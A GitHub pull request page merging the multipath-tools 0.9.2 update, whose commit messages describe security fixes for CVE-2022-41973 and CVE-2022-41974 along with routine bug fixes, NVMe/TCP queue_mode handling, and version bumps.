[opensvc:master](/opensvc/multipath-tools/tree/master "opensvc/multipath-tools:master")
from
[openSUSE:queue](/openSUSE/multipath-tools/tree/queue "openSUSE/multipath-tools:queue")

Oct 24, 2022

[Conversation
1](/opensvc/multipath-tools/pull/46)
[Commits
23](/opensvc/multipath-tools/pull/46/commits)
[Checks
0](/opensvc/multipath-tools/pull/46/checks)
[Files changed](/opensvc/multipath-tools/pull/46/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![mwilck](https://avatars.githubusercontent.com/u/15961354?s=60&v=4)](/mwilck)

Copy link

Contributor

### @mwilck **[mwilck](/mwilck)** commented [Oct 24, 2022](#issue-1420360633)

Hi [@cvaroqui](https://github.com/cvaroqui),

Here's a multipath-tools update for 0.9.2. The main parts are

* Series to fix the vulnerabilities [CVE-2022-41973](https://github.com/advisories/GHSA-6c7c-85qv-wvgp "CVE-2022-41973") ([cb57b93](https://github.com/opensvc/multipath-tools/commit/cb57b930fa690ab79b3904846634681685e3470f)) and [CVE-2022-41974](https://github.com/advisories/GHSA-46cw-54vx-86g5 "CVE-2022-41974") ([f812466](https://github.com/opensvc/multipath-tools/commit/f812466f68b8e020818c6454d7b7a7e278bc99f6)),
* Ben's series to use `queue_mode bio` for NVMeoF/TCP devices.

Note: commit [db807f3](https://github.com/opensvc/multipath-tools/commit/db807f36b6fee82ddd0b03f203f32a6b7b013ce1) has no `Reviewed-by:` tag, because I just discovered it

(but it's trivial and fixes a build bug on Fedora, so I'd rather include it in 0.9.2).

[@bmarzins](https://github.com/bmarzins) (11):

multipathd: fix read past end of of buffer in sending reply

kpartx: hold device open until partitions have been created

libmultipath: cleanup remove\_feature

libmultipath: cleanup add\_feature

multipath tests: tests for adding and removing features

libmultipath: fix queue\_mode feature handling

multipath tests: tests for reconcile\_features\_with\_queue\_mode

libmultipath: prepare proto\_id for use by non-scsi devivces

libmultipath: get nvme path transport protocol

libmultipath: enforce queue\_mode bio for nmve:tcp paths

libmultipath: don't print garbage keywords

[@Hi-Angel](https://github.com/Hi-Angel) (1):

README.md: mention libreadline and libedit optional deps (Fixes [#44](https://github.com/opensvc/multipath-tools/pull/44))

[@mwilck](https://github.com/mwilck) (9):

multipathd: more robust command parsing

multipathd: fix command completion with robust parser

multipath-tools tests: add test for command parsing

multipath-tools: use /run instead of /dev/shm

multipathd: uxlsnr: fix memory leak handling invalid commands

libmultipath: bump library version

mpathpersist: fix compilation error with clang 15

libmultipath: bump version to 0.9.2

[@xosevp](https://github.com/xosevp) (2):

multipath-tools: add more info for NetApp RDAC arrays

multipath-tools: update man pages with last modification date

Sorry, something went wrong.

All reactions

 [bmarzins](/bmarzins)
and others
added 23 commits
[September 9, 2022 23:22](#commits-pushed-7ac0f9c)

[![@bmarzins](https://avatars.githubusercontent.com/u/25468701?s=40&v=4)](/bmarzins) [![@mwilck](https://avatars.githubusercontent.com/u/15961354?s=40&v=4)](/mwilck)

`[multipathd: fix read past end of of buffer in sending reply](/opensvc/multipath-tools/pull/46/commits/7ac0f9c7f7819803a831d131c45f67bf44787d37 "multipathd: fix read past end of of buffer in sending reply

Reduce the send() length for the uxlsnr reply, by the number of bytes
already sent

Signed-off-by: Benjamin Marzinski <bmarzins@redhat.com>
Reviewed-by: Martin Wilck <mwilck@suse.com>")`
 …

`[7ac0f9c](/opensvc/multipath-tools/pull/46/commits/7ac0f9c7f7819803a831d131c45f67bf44787d37)`

```
Reduce the send() length for the uxlsnr reply, by the number of bytes
already sent

Signed-off-by: Benjamin Marzinski <bmarzins@redhat.com>
Reviewed-by: Martin Wilck <mwilck@suse.com>
```

[![@xosevp](https://avatars.githubusercontent.com/u/4960266?s=40&v=4)](/xosevp) [![@mwilck](https://avatars.githubusercontent.com/u/15961354?s=40&v=4)](/mwilck)

`[multipath-tools: add more info for NetApp RDAC arrays](/opensvc/multipath-tools/pull/46/commits/cc63cf00d725ef39b824a7fb2258a8a4d330a8ad "multipath-tools: add more info for NetApp RDAC arrays

To use ALUA mode:
\"Select operating system:\" should be changed to \"Linux DM-MP (Kernel 3.10 or later)\".

To use RDAC mode:
\"Select operating system:\" should be changed to \"Linux DM-MP (Kernel 3.9 or earlier)\".

Info from:
 https://library.netapp.com/ecmdocs/ECMLP2439710/html/GUID-49E94674-947F-4921-A1D1-CE9B42DCBA39.html
 https://library.netapp.com/ecmdocs/ECMLP2439710/html/GUID-CA17AE34-F5B2-4FF4-8FD4-4A7AA4238976.html
 https://library.netapp.com/ecmdocs/ECMLP2439710/html/GUID-3DA657A9-FF4A-4237-90EC-BA8863B7431E.html

Add it to prio and hardware_handler.

Cc: NetApp RDAC team <ng-eseries-upstream-maintainers@netapp.com>
Cc: Martin Wilck <mwilck@suse.com>
Cc: Benjamin Marzinski <bmarzins@redhat.com>
Cc: Christophe Varoqui <christophe.varoqui@opensvc.com>
Cc: DM-DEVEL ML <dm-devel@redhat.com>
Signed-off-by: Xose Vazquez Perez <xose.vazquez@gmail.com>
Reviewed-by: Steve Schremmer <steve.schremmer@netapp.com>")`
 …

`[cc63cf0](/opensvc/multipath-tools/pull/46/commits/cc63cf00d725ef39b824a7fb2258a8a4d330a8ad)`

```
To use ALUA mode:
"Select operating system:" should be changed to "Linux DM-MP (Kernel 3.10 or later)".

To use RDAC mode:
"Select operating system:" should be changed to "Linux DM-MP (Kernel 3.9 or earlier)".

Info from:
 <https://library.netapp.com/ecmdocs/ECMLP2439710/html/GUID-49E94674-947F-4921-A1D1-CE9B42DCBA39.html>
 <https://library.netapp.com/ecmdocs/ECMLP2439710/html/GUID-CA17AE34-F5B2-4FF4-8FD4-4A7AA4238976.html>
 <https://library.netapp.com/ecmdocs/ECMLP2439710/html/GUID-3DA657A9-FF4A-4237-90EC-BA8863B7431E.html>

Add it to prio and hardware_handler.

Cc: NetApp RDAC team <ng-eseries-upstream-maintainers@netapp.com>
Cc: Martin Wilck <mwilck@suse.com>
Cc: Benjamin Marzinski <bmarzins@redhat.com>
Cc: Christophe Varoqui <christophe.varoqui@opensvc.com>
Cc: DM-DEVEL ML <dm-devel@redhat.com>
Signed-off-by: Xose Vazquez Perez <xose.vazquez@gmail.com>
Reviewed-by: Steve Schremmer <steve.schremmer@netapp.com>
```

[![@xosevp](https://avatars.githubusercontent.com/u/4960266?s=40&v=4)](/xosevp) [![@mwilck](https://avatars.githubusercontent.com/u/15961354?s=40&v=4)](/mwilck)

`[multipath-tools: update man pages with last modification date](/opensvc/multipath-tools/pull/46/commits/64eaddb094e840bb533e177819b0b0121bb96064 "multipath-tools: update man pages with last modification date

Cc: Martin Wilck <mwilck@suse.com>
Cc: Benjamin Marzinski <bmarzins@redhat.com>
Cc: Christophe Varoqui <christophe.varoqui@opensvc.com>
Cc: DM-DEVEL ML <dm-devel@redhat.com>
Signed-off-by: Xose Vazquez Perez <xose.vazquez@gmail.com>
Reviewed-by: Martin Wilck <mwilck@suse.com>")`
 …

`[64eaddb](/opensvc/multipath-tools/pull/46/commits/64eaddb094e840bb533e177819b0b0121bb96064)`

```
Cc: Martin Wilck <mwilck@suse.com>
Cc: Benjamin Marzinski <bmarzins@redhat.com>
Cc: Christophe Varoqui <christophe.varoqui@opensvc.com>
Cc: DM-DEVEL ML <dm-devel@redhat.com>
Signed-off-by: Xose Vazquez Perez <xose.vazquez@gmail.com>
Reviewed-by: Martin Wilck <mwilck@suse.com>
```

[![@Hi-Angel](https://avatars.githubusercontent.com/u/7935057?s=40&v=4)](/Hi-Angel) [![@mwilck](https://avatars.githubusercontent.com/u/15961354?s=40&v=4)](/mwilck)

`[README.md: mention libreadline and libedit optional deps](/opensvc/multipath-tools/pull/46/commits/689f2e25060cdae70e4de6d2e9aa5c380e7be5f6 "README.md: mention libreadline and libedit optional deps

Commit:

    b7771447b \"multipathd: replace libreadline with libedit\"

replaced libreadline with libedit, and then later commits also made the
library-provided functional optional. However, the README file wasn't
updated. So update it now.

Signed-off-by: Konstantin Kharlamov <Hi-Angel@yandex.ru>
Reviewed-by: Martin Wilck <mwilck@suse.com>")`
 …

`[689f2e2](/opensvc/multipath-tools/pull/46/commits/689f2e25060cdae70e4de6d2e9aa5c380e7be5f6)`

```
Commit:

    [b777144](https://github.com/openSUSE/multipath-tools/commit/b7771447b971e4cb7f549f45663739fe6370164d) "multipathd: replace libreadline with libedit"

replaced libreadline with libedit, and then later commits also made the
library-provided functional optional. However, the README file wasn't
updated. So update it now.

Signed-off-by: Konstantin Kharlamov <Hi-Angel@yandex.ru>
Reviewed-by: Martin Wilck <mwilck@suse.com>
```

[![@mwilck](https://avatars.githubusercontent.com/u/15961354?s=40&v=4)](/mwilck)

`[multipathd: more robust command parsing](/opensvc/multipath-tools/pull/46/commits/f812466f68b8e020818c6454d7b7a7e278bc99f6 "multipathd: more robust command parsing

The current parser allows commands like \"path sda show\" or \"list list
add path sda\", because it doesn't enforce ordering of the keywords
and simply adds rather than or-s the values of the keys.

Rework this by using a separate byte for the \"verb\" and the allowed
qualifiers in the different positions of the command. No command
needs more than 3 qualifiers, so we disallow command vectors with
more than 4 elements, and change the type of the fingerprint to
uint32_t.

init_callbacks() is now required in both multipathc and multipathd
to initialize the table of handlers and fingerprints. But as m
ultipathc never calls any handler, we need not link the
entire handlers code into it.

Signed-off-by: Martin Wilck <mwilck@suse.com>
Reviewed-by: Benjamin Marzinski <bmarzins@redhat.com>")`
 …

`[f812466](/opensvc/multipath-tools/pull/46/commits/f812466f68b8e020818c6454d7b7a7e278bc99f6)`

```
The current parser allows commands like "path sda show" or "list list
add path sda", because it doesn't enforce ordering of the keywords
and simply adds rather than or-s the values of the keys.

Rework this by using a separate byte for the "verb" and the allowed
qualifiers in the different positions of the command. No command
needs more than 3 qualifiers, so we disallow command vectors with
more than 4 elements, and change the type of the fingerprint to
uint32_t.

init_callbacks() is now required in both multipathc and multipathd
to initialize the table of handlers and fingerprints. But as m
ultipathc never calls any handler, we need not link the
entire handlers code into it.

Signed-off-by: Martin Wilck <mwilck@suse.com>
Reviewed-by: Benjamin Marzinski <bmarzins@redhat.com>
```

[![@mwilck](https://avatars.githubusercontent.com/u/15961354?s=40&v=4)](/mwilck)

`[multipathd: fix command completion with robust parser](/opensvc/multipath-tools/pull/46/commits/d139bcf0842bc0a16beab86e1349ed65b150bf0c "multipathd: fix command completion with robust parser

The command completion must look at possible combinations of
keywords now. This makes it much more useful, actually.

Signed-off-by: Martin Wilck <mwilck@suse.com>
Reviewed-by: Benjamin Marzinski <bmarzins@redhat.com>")`
 …

`[d139bcf](/opensvc/multipath-tools/pull/46/commits/d139bcf0842bc0a16beab86e1349ed65b150bf0c)`

```
The command completion must look at possible combinations of
keywords now. This makes it much more useful, actually.

Signed-off-by: Martin Wilck <mwilck@suse.com>
Reviewed-by: Benjamin Marzinski <bmarzins@redhat.com>
```

[![@mwilck](https://avatars.githubusercontent.com/u/15961354?s=40&v=4)](/mwilck)

`[multipath-tools tests: add test for command parsing](/opensvc/multipath-tools/pull/46/commits/2a1ff3154c1d5de423c303ca3bc9ed9727b4e523 "multipath-tools tests: add test for command parsing

Add tests for parsing multipathd interactive commands.

Signed-off-by: Martin Wilck <mwilck@suse.com>
Reviewed-by: Benjamin Marzinski <bmarzins@redhat.com>")`
 …

`[2a1ff31](/opensvc/multipath-tools/pull/46/commits/2a1ff3154c1d5de423c303ca3bc9ed9727b4e523)`

```
Add tests for parsing multipathd interactive commands.

Signed-off-by: Martin Wilck <mwilck@suse.com>
Reviewed-by: Benjamin Marzinski <bmarzins@redhat.com>
```

[![@mwilck](https://avatars.githubusercontent.com/u/15961354?s=40&v=4)](/mwilck)

`[multipath-tools: use /run instead of /dev/shm](/opensvc/multipath-tools/pull/46/commits/cb57b930fa690ab79b3904846634681685e3470f "multipath-tools: use /run instead of /dev/shm

/dev/shm may have unsafe permissions. Use /run instead.
Use systemd's tmpfiles.d mechanism to create /run/multipath
early during boot.

For backward compatibilty, make the runtime directory configurable
via the \"runtimedir\" make variable.

Signed-off-by: Martin Wilck <mwilck@suse.com>
Reviewed-by: Benjamin Marzinski <bmarzins@redhat.com>")`
 …

`[cb57b93](/opensvc/multipath-tools/pull/46/commits/cb57b930fa690ab79b3904846634681685e3470f)`

```
/dev/shm may have unsafe permissions. Use /run instead.
Use systemd's tmpfiles.d mechanism to create /run/multipath
early during boot.

For backward compatibilty, make the runtime directory configurable
via the "runtimedir" make variable.

Signed-off-by: Martin Wilck <mwilck@suse.com>
Reviewed-by: Benjamin Marzinski <bmarzins@redhat.com>
```

[![@mwilck](https://avatars.githubusercontent.com/u/15961354?s=40&v=4)](/mwilck)

`[multipathd: uxlsnr: fix memory leak handling invalid commands](/opensvc/multipath-tools/pull/46/commits/994811a29332161ec150f1d9822ff460cfc0f316 "multipathd: uxlsnr: fix memory leak handling invalid commands

If a client sends invalid commands with at least one correct keyword,
(e.g \"show bogus\"), get_cmdvec() returns 0 and c->cmdvec is allocated but
never freed. Fix it by freeing the cmdvec when setting the state to
CLT_SEND.

Signed-off-by: Martin Wilck <mwilck@suse.com>
Suggested-by: Qualys Security Advisory <qsa@qualys.com>
Reviewed-by: Benjamin Marzinski <bmarzins@redhat.com>")`
 …

`[994811a](/opensvc/multipath-tools/pull/46/commits/994811a29332161ec150f1d9822ff460cfc0f316)`

```
If a client sends invalid commands with at least one correct keyword,
(e.g "show bogus"), get_cmdvec() returns 0 and c->cmdvec is allocated but
never freed. Fix it by freeing the cmdvec when setting the state to
CLT_SEND.

Signed-off-by: Martin Wilck <mwilck@suse.com>
Suggested-by: Qualys Security Advisory <qsa@qualys.com>
Reviewed-by: Benjamin Marzinski <bmarzins@redhat.com>
```

[![@bmarzins](https://avatars.githubusercontent.com/u/25468701?s=40&v=4)](/bmarzins) [![@mwilck](https://avatars.githubusercontent.com/u/15961354?s=40&v=4)](/mwilck)

`[kpartx: hold device open until partitions have been created](/opensvc/multipath-tools/pull/46/commits/bf8a3f2feaac8d0883fff552891f7e9c20eaa85b "kpartx: hold device open until partitions have been created

kpartx was closing the whole device after it read the partition
information off it.  This allowed a race, where the device could be
removed and another one created with the same major:minor, after kpartx
read the partition information but before it created the partition
devices.

Signed-off-by: Benjamin Marzinski <bmarzins@redhat.com>
Reviewed-by: Martin Wilck <mwilck@suse.com>")`
 …

`[bf8a3f2](/opensvc/multipath-tools/pull/46/commits/bf8a3f2feaac8d0883fff552891f7e9c20eaa85b)`

```
kpartx was closing the whole device after it read the partition
information off it.  This allowed a race, where the device could be
removed and another one created with the same major:minor, after kpartx
read the partition information but before it created the partition
devices.

Signed-off-by: Benjamin Marzinski <bmarzins@redhat.com>
Reviewed-by: Martin Wilck <mwilck@suse.com>
```

[![@bmarzins](https://avatars.githubusercontent.com/u/25468701?s=40&v=4)](/bmarzins) [![@mwilck](https://avatars.githubusercontent.com/u/15961354?s=40&v=4)](/mwilck)

`[libmultipath: cleanup remove_feature](/opensvc/multipath-tools/pull/46/commits/ef3eee843fdd8d8e9687df16f6519aef0ef8d9d8 "libmultipath: cleanup remove_feature

remove_feature() didn't correctly handle feature strings that used
whitespace other than spaces, which the kernel allows. It also didn't
check if the feature string to be removed was part of a larger feature
token. Finally, it did a lot of unnecessary work. By failing if the
feature string to be removed contains leading or trailing whitespace,
the function can be significanly simplified.

Signed-off-by: Benjamin Marzinski <bmarzins@redhat.com>
Reviewed-by: Martin Wilck <mwilck@suse.com>")`
 …

`[ef3eee8](/opensvc/multipath-tools/pull/46/commits/ef3eee843fdd8d8e9687df16f6519aef0ef8d9d8)`

```
remove_feature() didn't correctly handle feature strings that used
whitespace other than spaces, which the kernel allows. It also didn't
check if the feature string to be removed was part of a larger feature
token. Finally, it did a lot of unnecessary work. By failing if the
feature string to be removed contains leading or trailing whitespace,
the function can be significanly simplified.

Signed-off-by: Benjamin Marzinski <bmarzins@redhat.com>
Reviewed-by: Martin Wilck <mwilck@suse.com>
```

[![@bmarzins](https://avatars.githubusercontent.com/u/25468701?s=40&v=4)](/bmarzins) [![@mwilck](https://avatars.githubusercontent.com/u/15961354?s=40&v=4)](/mwilck)

`[libmultipath: cleanup add_feature](/opensvc/multipath-tools/pull/46/commits/dfc44d54e7c745c4b9624c825850803b8ec96f74 "libmultipath: cleanup add_feature

add_feature() didn't correctly handle feature strings that used
whitespace other than spaces, which the kernel allows. It also didn't
allow adding features with multiple tokens. When it looked to see if the
feature string to be added already existed, it didn't check if the match
was part of a larger token. Finally, it did unnecessary work.  By using
asprintf() to create the string, the function can be signifcantly
simplified.

Signed-off-by: Benjamin Marzinski <bmarzins@redhat.com>
Reviewed-by: Martin Wilck <mwilck@suse.com>")`
 …

`[dfc44d5](/opensvc/multipath-tools/pull/46/commits/dfc44d54e7c745c4b9624c825850803b8ec96f74)`

```
add_feature() didn't correctly handle feature strings that used
whitespace other than spaces, which the kernel allows. It also didn't
allow adding features with multiple tokens. When it looked to see if the
feature string to be added already existed, it didn't check if the match
was part of a larger token. Finally, it did unnecessary work.  By using
asprintf() to create the string, the function can be signifcantly
simplified.

Signed-off-by: Benjamin Marzinski <bmarzins@redhat.com>
Reviewed-by: Martin Wilck <mwilck@suse.com>
```

[![@bmarzins](https://avatars.githubusercontent.com/u/25468701?s=40&v=4)](/bmarzins) [![@mwilck](https://avatars.githubusercontent.com/u/15961354?s=40&v=4)](/mwilck)

`[multipath tests: tests for adding and removing features](/opensvc/multipath-tools/pull/46/commits/8165603e9fddf1496ef0ba2af91e61430f4577b1 "multipath tests: tests for adding and removing features

Signed-off-by: Benjamin Marzinski <bmarzins@redhat.com>
Reviewed-by: Martin Wilck <mwilck@suse.com>")`
 …

`[8165603](/opensvc/multipath-tools/pull/46/commits/8165603e9fddf1496ef0ba2af91e61430f4577b1)`

```
Signed-off-by: Benjamin Marzinski <bmarzins@redhat.com>
Reviewed-by: Martin Wilck <mwilck@suse.com>
```

[![@bmarzins](https://avatars.githubusercontent.com/u/25468701?s=40&v=4)](/bmarzins) [![@mwilck](https://avatars.githubusercontent.com/u/15961354?s=40&v=4)](/mwilck)

`[libmultipath: fix queue_mode feature handling](/opensvc/multipath-tools/pull/46/commits/84232578761b39818ce1c552f15207d689979bfd "libmultipath: fix queue_mode feature handling

device-mapper is not able to change the queue_mode on a table reload.
Make sure that when multipath sets up the map, both on regular reloads
and reconfigures, it keeps the queue_mode the same.

Signed-off-by: Benjamin Marzinski <bmarzins@redhat.com>
Reviewed-by: Martin Wilck <mwilck@suse.com>")`
 …

`[8423257](/opensvc/multipath-tools/pull/46/commits/84232578761b39818ce1c552f15207d689979bfd)`

```
device-mapper is not able to change the queue_mode on a table reload.
Make sure that when multipath sets up the map, both on regular reloads
and reconfigures, it keeps the queue_mode the same.

Signed-off-by: Benjamin Marzinski <bmarzins@redhat.com>
Reviewed-by: Martin Wilck <mwilck@suse.com>
```

[![@bmarzins](https://avatars.githubusercontent.com/u/25468701?s=40&v=4)](/bmarzins) [![@mwilck](https://avatars.githubusercontent.com/u/15961354?s=40&v=4)](/mwilck)

`[multipath tests: tests for reconcile_features_with_queue_mode](/opensvc/multipath-tools/pull/46/commits/fb139b5ac2173bf9a2f7ac2f63d4fc2ec9ce7dcc "multipath tests: tests for reconcile_features_with_queue_mode

Signed-off-by: Benjamin Marzinski <bmarzins@redhat.com>
Reviewed-by: Martin Wilck <mwilck@suse.com>")`
 …

`[fb139b5](/opensvc/multipath-tools/pull/46/commits/fb139b5ac2173bf9a2f7ac2f63d4fc2ec9ce7dcc)`

```
Signed-off-by: Benjamin Marzinski <bmarzins@redhat.com>
Reviewed-by: Martin Wilck <mwilck@suse.com>
```

[![@bmarzins](https://avatars.githubusercontent.com/u/25468701?s=40&v=4)](/bmarzins) [![@mwilck](https://avatars.githubusercontent.com/u/15961354?s=40&v=4)](/mwilck)

`[libmultipath: prepare proto_id for use by non-scsi devivces](/opensvc/multipath-tools/pull/46/commits/cd30e88ffd2cb6b90dedf1e1c2a5d6466811414c "libmultipath: prepare proto_id for use by non-scsi devivces

Make sure that when we are checking for a scsi protocol, we are first
checking that we are working with a scsi path.

Signed-off-by: Benjamin Marzinski <bmarzins@redhat.com>
Reviewed-by: Martin Wilck <mwilck@suse.com>")`
 …

`[cd30e88](/opensvc/multipath-tools/pull/46/commits/cd30e88ffd2cb6b90dedf1e1c2a5d6466811414c)`

```
Make sure that when we are checking for a scsi protocol, we are first
checking that we are working with a scsi path.

Signed-off-by: Benjamin Marzinski <bmarzins@redhat.com>
Reviewed-by: Martin Wilck <mwilck@suse.com>
```

[![@bmarzins](https://avatars.githubusercontent.com/u/25468701?s=40&v=4)](/bmarzins) [![@mwilck](https://avatars.githubusercontent.com/u/15961354?s=40&v=4)](/mwilck)

`[libmultipath: get nvme path transport protocol](/opensvc/multipath-tools/pull/46/commits/32a39d243d7493766c6485c9c666b6676195cc15 "libmultipath: get nvme path transport protocol

Read the transport protocol from /sys/block/nvmeXnY/device/transport.
Update protocol_name[] and bus_protocol_id() to store the nvme protocol
names after the scsi protocol names.

Signed-off-by: Benjamin Marzinski <bmarzins@redhat.com>
Reviewed-by: Martin Wilck <mwilck@suse.com>")`
 …

`[32a39d2](/opensvc/multipath-tools/pull/46/commits/32a39d243d7493766c6485c9c666b6676195cc15)`

```
Read the transport protocol from /sys/block/nvmeXnY/device/transport.
Update protocol_name[] and bus_protocol_id() to store the nvme protocol
names after the scsi protocol names.

Signed-off-by: Benjamin Marzinski <bmarzins@redhat.com>
Reviewed-by: Martin Wilck <mwilck@suse.com>
```

[![@bmarzins](https://avatars.githubusercontent.com/u/25468701?s=40&v=4)](/bmarzins) [![@mwilck](https://avatars.githubusercontent.com/u/15961354?s=40&v=4)](/mwilck)

`[libmultipath: enforce queue_mode bio for nmve:tcp paths](/opensvc/multipath-tools/pull/46/commits/3687f9afd41d3a6f8c078ba7924f117c54c7f787 "libmultipath: enforce queue_mode bio for nmve:tcp paths

nvme:tcp devices set BLK_MQ_F_BLOCKING (they are the only block devices
which multipath supports that do so), meaning that block_mq expects that
they can block at certain points while servicing a request.  However,
due to the way device-mapper sets up its queue, it is not able to set
BLK_MQ_F_BLOCKING when it includes paths that set this flag.  Patches
were written to address this issue but they were rejected upstream

https://lore.kernel.org/linux-block/YcH%2FE4JNag0QYYAa@infradead.org/T/#t

The proposed solution was to have multipath use the bio queue_mode for
multipath devices that include nvme:tcp paths.

Multipath devices now automatically add the \"queue_mode bio\" feature if
they include nvme:tcp paths.  If a multipath devices was created with
\"queue_mode rq\", it will disallow the addition of nvme:tcp paths.

Signed-off-by: Benjamin Marzinski <bmarzins@redhat.com>
Reviewed-by: Martin Wilck <mwilck@suse.com>")`
 …

`[3687f9a](/opensvc/multipath-tools/pull/46/commits/3687f9afd41d3a6f8c078ba7924f117c54c7f787)`

```
nvme:tcp devices set BLK_MQ_F_BLOCKING (they are the only block devices
which multipath supports that do so), meaning that block_mq expects that
they can block at certain points while servicing a request.  However,
due to the way device-mapper sets up its queue, it is not able to set
BLK_MQ_F_BLOCKING when it includes paths that set this flag.  Patches
were written to address this issue but they were rejected upstream

[https://lore.kernel.org/linux-block/YcH%2FE4JNag0QYYAa@infradead.org/T/#t](https://lore.kernel.org/linux-block/YcH/E4JNag0QYYAa%40infradead.org/T/#t)

The proposed solution was to have multipath use the bio queue_mode for
multipath devices that include nvme:tcp paths.

Multipath devices now automatically add the "queue_mode bio" feature if
they include nvme:tcp paths.  If a multipath devices was created with
"queue_mode rq", it will disallow the addition of nvme:tcp paths.

Signed-off-by: Benjamin Marzinski <bmarzins@redhat.com>
Reviewed-by: Martin Wilck <mwilck@suse.com>
```

[![@bmarzins](https://avatars.githubusercontent.com/u/25468701?s=40&v=4)](/bmarzins) [![@mwilck](https://avatars.githubusercontent.com/u/15961354?s=40&v=4)](/mwilck)

`[libmultipath: don't print garbage keywords](/opensvc/multipath-tools/pull/46/commits/e5c020f41277d4d127b6c6f95bbbc789481b837b "libmultipath: don't print garbage keywords

If snprint_keyword() failed to correctly set up sbuf, don't print it.
Instead, return an error.

Signed-off-by: Benjamin Marzinski <bmarzins@redhat.com>
Reviewed-by: Martin Wilck <mwilck@suse.com>")`
 …

`[e5c020f](/opensvc/multipath-tools/pull/46/commits/e5c020f41277d4d127b6c6f95bbbc789481b837b)`

```
If snprint_keyword() failed to correctly set up sbuf, don't print it.
Instead, return an error.

Signed-off-by: Benjamin Marzinski <bmarzins@redhat.com>
Reviewed-by: Martin Wilck <mwilck@suse.com>
```

[![@mwilck](https://avatars.githubusercontent.com/u/15961354?s=40&v=4)](/mwilck)

`[libmultipath: bump library version](/opensvc/multipath-tools/pull/46/commits/e5eb22613f7c9a18b124f9346dc2ddcedb675500 "libmultipath: bump library version

Adapt ABI version after commit 8423257 (\"libmultipath: fix queue_mode feature
handling\").")`
 …

`[e5eb226](/opensvc/multipath-tools/pull/46/commits/e5eb22613f7c9a18b124f9346dc2ddcedb675500)`

```
Adapt ABI version after commit [8423257](https://github.com/openSUSE/multipath-tools/commit/84232578761b39818ce1c552f15207d689979bfd) ("libmultipath: fix queue_mode feature
handling").
```

[![@mwilck](https://avatars.githubusercontent.com/u/15961354?s=40&v=4)](/mwilck)

`[Merge fixes for](/opensvc/multipath-tools/pull/46/commits/c4912a639b7ff527aa11d665944594926ff94a7a "Merge fixes for CVE-2022-41973 and CVE-2022-41974

These vulnerabilities have been reported by the Qualys security team
(<qsa@qualys.com>), who also assisted in creating and reviewing the
fixes.

The important commits for fixing the issues are:

CVE-41973: cb57b93 (\"multipath-tools: use /run instead of /dev/shm\")
CVE-41974: f812466 (\"multipathd: more robust command parsing\")") [CVE-2022-41973](https://github.com/advisories/GHSA-6c7c-85qv-wvgp "CVE-2022-41973") [and](/opensvc/multipath-tools/pull/46/commits/c4912a639b7ff527aa11d665944594926ff94a7a "Merge fixes for CVE-2022-41973 and CVE-2022-41974

These vulnerabilities have been reported by the Qualys security team
(<qsa@qualys.com>), who also assisted in creating and reviewing the
fixes.

The important commits for fixing the issues are:

CVE-41973: cb57b93 (\"multipath-tools: use /run instead of /dev/shm\")
CVE-41974: f812466 (\"multipathd: more robust command parsing\")") [CVE-2022-41974](https://github.com/advisories/GHSA-46cw-54vx-86g5 "CVE-2022-41974")`
 …

`[c4912a6](/opensvc/multipath-tools/pull/46/commits/c4912a639b7ff527aa11d665944594926ff94a7a)`

```
These vulnerabilities have been reported by the Qualys security team
(<qsa@qualys.com>), who also assisted in creating and reviewing the
fixes.

The important commits for fixing the issues are:

CVE-41973: [cb57b93](https://github.com/openSUSE/multipath-tools/commit/cb57b930fa690ab79b3904846634681685e3470f) ("multipath-tools: use /run instead of /dev/shm")
CVE-41974: [f812466](https://github.com/openSUSE/multipath-tools/commit/f812466f68b8e020818c6454d7b7a7e278bc99f6) ("multipathd: more robust command parsing")
```

[![@mwilck](https://avatars.githubusercontent.com/u/15961354?s=40&v=4)](/mwilck)

`[mpathpersist: fix compilation error with clang 15](/opensvc/multipath-tools/pull/46/commits/db807f36b6fee82ddd0b03f203f32a6b7b013ce1 "mpathpersist: fix compilation error with clang 15

The following error was thrown with clang 15:

main.c:181:6: error: variable 'num_prout_param' set but not used [-Werror,-Wunused-but-set-variable]
        int num_prout_param = 0;
            ^

Indeed num_prout_param was never used. Fix it.

Signed-off-by: Martin Wilck <mwilck@suse.com>")`
 …

`[db807f3](/opensvc/multipath-tools/pull/46/commits/db807f36b6fee82ddd0b03f203f32a6b7b013ce1)`

```
The following error was thrown with clang 15:

main.c:181:6: error: variable 'num_prout_param' set but not used [-Werror,-Wunused-but-set-variable]
        int num_prout_param = 0;
            ^

Indeed num_prout_param was never used. Fix it.

Signed-off-by: Martin Wilck <mwilck@suse.com>
```

[![@mwilck](https://avatars.githubusercontent.com/u/15961354?s=40&v=4)](/mwilck)

`[libmultipath: bump version to 0.9.2](/opensvc/multipath-tools/pull/46/commits/0930c6e32a8f72b3077b77613a12de6aa6da89d2 "libmultipath: bump version to 0.9.2

Signed-off-by: Martin Wilck <mwilck@suse.com>")`
 …

`[0930c6e](/opensvc/multipath-tools/pull/46/commits/0930c6e32a8f72b3077b77613a12de6aa6da89d2)`

```
Signed-off-by: Martin Wilck <mwilck@suse.com>
```

 [![@mwilck](https://avatars.githubusercontent.com/u/15961354?s=40&u=2927c291756f063bb6b94147de7397a14f6afe68&v=4)](/mwilck)
[mwilck](/mwilck)
requested a review
from [bmarzins](/bmarzins)
[October 24, 2022 07:36](#event-7651180220)

[![@cvaroqui](https://avatars.githubusercontent.com/u/17934877?s=40&u=8f5614ec2de25b000a5780c0cd89042d86e8945d&v=4)](/cvaroqui)
[cvaroqui](/cvaroqui)
merged commit [`66664cd`](/opensvc/multipath-tools/commit/66664cdb52f548b821b2ea28e49613c068e9375d)
into
opensvc:master

[Oct 24, 2022](https://github.com/opensvc/multipath-tools/pull/46#event-7651199125)

[![bmarzins](https://avatars.githubusercontent.com/u/25468701?s=60&v=4)](/bmarzins)

**[bmarzins](/bmarzins)**
reviewed
[Oct 25, 2022](#pullrequestreview-1155417182)

 [View reviewed changes](/opensvc/multipath-tools/pull/46/files/0930c6e32a8f72b3077b77613a12de6aa6da89d2)

Copy link

Contributor

### @bmarzins **[bmarzins](/bmarzins)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

ACK.

Sorry, something went wrong.

All reactions

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
